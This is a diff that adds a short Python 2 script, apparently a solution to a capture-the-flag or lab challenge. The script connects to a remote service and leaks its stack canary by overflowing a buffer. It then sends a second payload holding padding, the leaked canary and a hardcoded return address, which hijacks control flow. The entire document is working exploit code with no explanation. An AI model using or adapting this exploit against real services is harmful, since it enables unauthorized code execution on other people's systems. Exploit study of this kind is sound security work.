@@ -1,0 +1,19 @@
+#!/usr/bin/python2
+
+import sys
+import socket
+
+retaddr='\x4b\x88\x04\x08'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((sys.argv[1], int(sys.argv[2])))
+
+s.send('A' * 65)
+response = s.recv(1024) #1024)
+canary='\0' + response[65:68]
+
+s.send('end' + 'A' * 61 + canary + 'B' * 12 + retaddr)
+s.recv(1024)
+response = s.recv(1024)
+print response
+s.close()
